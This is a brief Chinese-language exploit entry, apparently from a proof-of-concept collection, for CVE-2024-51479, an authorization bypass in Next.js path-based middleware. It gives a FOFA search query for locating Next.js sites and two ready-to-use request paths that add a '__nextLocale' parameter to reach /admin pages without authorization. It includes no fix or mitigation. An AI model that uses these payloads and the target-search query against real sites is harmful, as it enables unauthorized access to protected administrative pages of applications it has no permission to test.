# Next.js权限绕过(CVE-2024-51479)

Next.js 是一个用于构建全栈 Web 应用程序的 React 框架。在受影响的版本中，如果 Next.js 应用程序正在基于路径名的中间件中执行授权，则可能会绕过应用程序根目录下的页面的此授权，允许未经授权访问Next.js应用程序中的根级页面，这些页面本应受到授权检查的保护

## fofa
```javascript
app="NEXT.JS"
```

## poc
```javascript
/admin?__nextLocale=111
/admin/users?__nextLocale=anything
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202501041404258.png)

## 漏洞来源

- https://mp.weixin.qq.com/s/rPBKzvNI9wc79tDr2KC5sA